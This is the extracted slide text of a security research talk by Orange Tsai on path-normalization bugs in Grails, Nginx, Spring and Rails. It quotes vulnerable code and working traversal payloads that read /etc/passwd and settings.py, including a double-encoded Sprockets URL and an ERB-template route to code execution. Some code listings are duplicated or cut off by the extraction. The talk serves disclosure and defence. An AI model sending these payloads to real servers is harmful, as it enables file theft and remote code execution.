Breaking Parser Logic!
Take Your Path Normalization Off and Pop 0days Out
Orange Tsai
Orange Tsai
• Security researcher at DEVCORE
• Hacks in Taiwan member
orange_8361
Agenda
1.
Introduce the difficulty
2. In-depthly review existing implementations
3. New multi-layered architecture attack surface
Normalize
To make standard; determine the value by comparison to 
an item of known standard value
Why normalization?
To protect something
Inconsistency
if (check(path)) {
use(path)
}
Why path normalization
• Most web handle files(and apply lots of security mechanism)
• Lack of overall security review
• Code change too fast, does the patch and protection still work?
• The 3 years Mojarra story - from CVE-2013-3827 to CVE-2018-1234
How parsers could be failed?
Can you spot the vulnerability?
static String QUOTED_FILE_SEPARATOR = Pattern.quote(File.separator)
static String DIRECTIVE_FILE_SEPARATOR = '/'
public AssetFile getAsset(String relativePath) {
if(!relativePath)
return null
relativePath = relativePath.replace( QUOTED_FILE_SEPARATOR, 
DIRECTIVE_FILE_SEPARATOR)
replace v.s. replaceAll
String replace(String target, String replacement)
String replaceAll(String regex, String replacement)
Can you spot the vulnerability?
static String QUOTED_FILE_SEPARATOR = Pattern.quote(File.separator)
static String DIRECTIVE_FILE_SEPARATOR = '/'
public AssetFile getAsset(String relativePath) {
if(!relativePath)
return null
relativePath = relativePath.replace( QUOTED_FILE_SEPARATOR, 
DIRECTIVE_FILE_SEPARATOR)
Pattern.quote("/") = "\Q/\E"
..\Q/\E is the new  ../ in Grails
/app/static/ v.s. /app/static
How single slash could be failed?
Nginx off-by-slash fail
• First shown in 2016 December HCTF - credit to @iaklis
• A good attack vector but very few people know
• Nginx says this is not their problem
• Nginx alias directive
• Defines a replacement for the specified location
Nginx off-by-slash fail
http://127.0.0.1/static/../settings.py
Nginx normalizes /static/../settings.py to /settings.py
does not match the rule
location /static {
alias /home/app/static/;
}
Nginx off-by-slash fail
http://127.0.0.1/static../settings.pya
Nginx matches the rule and appends the remainder to destination
/home/app/static/../settings.py
location /static {
alias /home/app/static/;
}
How to find in real world
• Discovered in a private bug bounty program and got the 
maximum bounty from that program!
200
http://target/static/app.js
403
http://target/static/
404
http://target/static/../settings.py
403
http://target/static../
200
http://target/static../static/app.js
200
http://target/static../settings.py
new URL("file:///etc/passwd?/../../Windows/win.ini")
Windows treat as UNC
Linux treat as URL
Polyglot URL path
• Applications relied on getPath() in Windows
• Normalized result from getFile() or toExternalForm() in Linux
URL base = new URL("file:///C:/Windows/temp/");
URL url
= new URL(base, "file?/../../win.ini");
URL base = new URL("file:///tmp/");
URL url  = new URL(base, "../etc/passwd?/../../tmp/file");
0days I found
CVE
Ruby on Rails
CVE-2018-3760
Sinatra
CVE-2018-7212
Spring Framework
CVE-2018-1271
Spark Framework
CVE-2018-9159
Jenkins
Pending
Mojarra
Pending
Next.js
CVE-2018-6184
resolve-path
CVE-2018-3732
Aiohttp
None
Lighttpd
Pending
Agenda
1.
Introduce the difficulty
2. In-depthly review existing implementations
• Discovered Spring Framework CVE-2018-1271
• Discovered Ruby on Rails CVE-2018-3760
3. New multi-layered architectures attack surface
Spring 0day - CVE-2018-1271
• Directory Traversal with Spring MVC on Windows
• The patch of CVE-2014-3625
1.
isInvalidPath(path)
2.
isInvalidPath(URLDecoder.decode(path, "UTF-8"))
3.
isResourceUnderLocation(resource, location)
1 protected boolean isInvalidPath(String path) {
2 
if (path.contains("WEB-INF") || path.contains("META-INF")) {
3 
return true;
4 
}
5 
if (path.contains(":/")) {
6 
return true;
7 
}
8 
if (path.contains("..")) {
9 
path = cleanPath(path);
10
if (path.contains("../"))
11 
return true;
12 
}
13
14 
return false;
15 }
Dangerous Pattern :(
1
public static String cleanPath(String path) {
2 
String pathToUse = replace(path, "\\", "/");
3 
4  
String[] pathArray = delimitedListToStringArray(pathToUse, "/");
5  
List pathElements = new LinkedList<>();
6  
int tops = 0;
7  
8  
for (int i = pathArray.length - 1; i >= 0; i--) {
9  
String element = pathArray[i];
10  
if (".".equals(element)) {
11
12 
} else if ("..".equals(element)) {
13 
tops++;
14 
} else {
15 
if (tops > 0)
16 
tops--;
17 
else
18 
pathElements.add(0, element);
19 
}
20 
}
21
22 
for (int i = 0; i  pathElements = new LinkedList<>();
6  
int tops = 0;
7  
8  
for (int i = pathArray.length - 1; i >= 0; i--) {
9  
String element = pathArray[i];
10  
if (".".equals(element)) {
11
12 
} else if ("..".equals(element)) {
13 
tops++;
14 
} else {
15 
if (tops > 0)
16 
tops--;
17 
else
18 
pathElements.add(0, element);
19 
}
20 
}
21
22 
for (int i = 0; i 
Date:   Sun May 18 12:04:11 2014 +0200
+   public static String cleanPath(String path) {
+       if (path == null) {
+       ...
Rails 0day - CVE-2018-3760
• Path traversal on @rails/sprockets
• Sprockets is the asset pipeline system in Rails
• Affected Rails under development environment
• Or production mode with assets.compile flag on
Vulnerable enough!
$ rails new blog && cd blog
$ rails server
Listening on tcp://0.0.0.0:3000
Rails 0day - CVE-2018-3760
1.
Sprockets supports file:// scheme that bypassed absolute_path?
2.
URL decode bypassed double slashes normalization
3.
Method split_file_uri resolved URI and unescape again
• Lead to double encoding and bypass forbidden_request? and prefix check
http://127.0.0.1:3000/assets/file:%2f%2f/app/assets/images
/%252e%252e/%252e%252e/%252e%252e/etc/passwd
For the RCE lover
• This vulnerability is possible to RCE
• Inject query string %3F to File URL
• Render as ERB template if the extension is .erb
http://127.0.0.1:3000/assets/file:%2f%2f/app/assets/images/%252e%252e
/%252e%252e/%252e%252e/tmp/evil.erb%3ftype=text/plain
/tmp/evil.erb